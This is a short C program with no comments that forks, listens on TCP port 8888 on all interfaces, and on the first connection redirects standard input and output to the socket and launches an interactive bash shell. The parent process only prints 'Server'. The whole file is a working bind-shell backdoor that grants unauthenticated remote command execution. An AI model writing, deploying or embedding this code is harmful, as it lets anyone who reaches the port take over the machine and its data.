 #include <stdio.h>
 #include <stdlib.h>
 
 #include <sys/types.h>
 #include <sys/socket.h>
 #include <netinet/in.h>
 #include <arpa/inet.h>
 #include <unistd.h>
 
 
 int main()
 {
	int sock, addrlen, client;
	struct sockaddr_in name; 
	struct sockaddr client_info; 
	char buf[1001];
	int size;
	
	close(2);
	dup(1);
	
	int pid = fork();
	
	if (pid < 0) {
		puts("fork");
	}	
	else if (pid == 0)
	{
		if ((sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == -1)
		{
			puts("socket");
			return -1;
		}
		
		name.sin_family = AF_INET;
		name.sin_port = htons(8888);
		name.sin_addr.s_addr = INADDR_ANY;
		if (bind(sock, (struct sockaddr *)&name, sizeof(name)) == -1)
		{
			puts("bind");
			return -1;
		}
		
		if (listen(sock, 10) == -1)
		{
			puts("listen");
			return -1;
		}
		addrlen = sizeof(client);
		client = accept(sock, (struct sockaddr*)&client_info, &addrlen);
		if (client == -1)
		{
			puts("accept");
		}
			
		close(0);
		close(1);
		close(2);
		dup(client);
		dup(client);
		dup(client);
		
		execl("/bin/bash", "/bin/bash", "-i", NULL);
	}
	else
	{
		puts("Server");
	}
	
 
	return 0;
 }
